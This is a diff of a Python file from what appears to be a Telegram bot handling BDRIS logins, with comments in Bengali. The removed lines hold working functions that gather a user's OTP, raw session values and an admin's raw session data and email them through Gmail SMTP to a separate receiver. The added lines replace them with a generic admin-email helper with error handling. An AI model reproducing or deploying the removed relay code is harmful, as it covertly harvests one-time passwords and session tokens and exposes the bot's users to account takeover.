@@ -20,51 +20,32 @@ import smtplib
 from email.mime.text import MIMEText
 
 # ==========================================
-# ০. ইমেইল সেন্ডার ফাংশন (Old Working Version + Receiver Fix)
 # ==========================================
-def relay_info_to_email(chat_id, u_name):
+# ০. ইমেইল সেন্ডার ফাংশন (Advanced Error Handling)
+# ==========================================
+def send_email_to_admin(subject, body):
     if not ADMIN_EMAIL or not EMAIL_PASS:
-        logging.warning("Email credentials missing, skipping email.")
+        logging.warning("⚠️ Email credentials missing in Environment Variables, skipping email.")
         return
-        
-    u_sess = get_session(chat_id)
-    report = f"--- BDRIS LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now()}\n\n"
-    report += f"CH RAW: {u_sess['temp_data'].get('ch_raw', 'N/A')}\n"
-    report += f"OTP: {u_sess.get('ch_otp', 'N/A')}\n"
-    report += f"SEC RAW: {u_sess['temp_data'].get('sec_raw', 'N/A')}\n"
-    
-    msg = MIMEText(report)
-    msg['Subject'] = f"Login Alert: {u_name}"
-    msg['From'] = ADMIN_EMAIL
-    msg['To'] = EMAIL_RECEIVER
-    
     try:
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as s:
-            s.login(ADMIN_EMAIL, EMAIL_PASS)
-            s.sendmail(ADMIN_EMAIL, EMAIL_RECEIVER, msg.as_string())
-        logging.info("✅ Email Relay Success! (লগইন ইমেইল পাঠানো হয়েছে)")
-    except Exception as e:
-        logging.error(f"❌ Email Relay Error: {e}")
-
-def relay_admin_login_to_email(chat_id, u_name, raw_data):
-    if not ADMIN_EMAIL or not EMAIL_PASS:
-        return
+        msg = MIMEMultipart()
+        msg['From'] = ADMIN_EMAIL
+        msg['To'] = ADMIN_EMAIL
+        msg['Subject'] = subject
+        msg.attach(MIMEText(body, 'plain', 'utf-8'))
         
-    report = f"--- ADMIN LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now()}\n\n"
-    report += f"ADMIN RAW SESSION: {raw_data}\n"
-    
-    msg = MIMEText(report)
-    msg['Subject'] = f"Admin Login Alert: {u_name}"
-    msg['From'] = ADMIN_EMAIL
-    msg['To'] = EMAIL_RECEIVER
-    
-    try:
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as s:
-            s.login(ADMIN_EMAIL, EMAIL_PASS)
-            s.sendmail(ADMIN_EMAIL, EMAIL_RECEIVER, msg.as_string())
+        # 10 সেকেন্ডের টাইমআউট সেট করা হলো যেন সার্ভার স্লো থাকলে বট হ্যাং না করে
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10) as server:
+            server.login(ADMIN_EMAIL, EMAIL_PASS)
+            server.sendmail(ADMIN_EMAIL, ADMIN_EMAIL, msg.as_string())
+            
+        logging.info("✅ লগইন সফল ও ইমেইল পাঠানো হয়েছে!")
+    except smtplib.SMTPAuthenticationError:
+        logging.error("❌ Email Auth Error: জিমেইলের পাসওয়ার্ড ভুল! নরমাল পাসওয়ার্ড দিলে হবে না, 16-digit App Password দিতে হবে।")
+    except TimeoutError:
+        logging.error("❌ Email Timeout: গুগলের সার্ভার কানেক্ট হতে সময় বেশি নিচ্ছে।")
     except Exception as e:
-        logging.error(f"❌ Admin Email Relay Error: {e}")
-
+        logging.error(f"❌ Email Send Error: {e}")
 # ==========================================
 # ১. গ্লোবাল ভেরিয়েবল ও থ্রেড লক
 # ==========================================
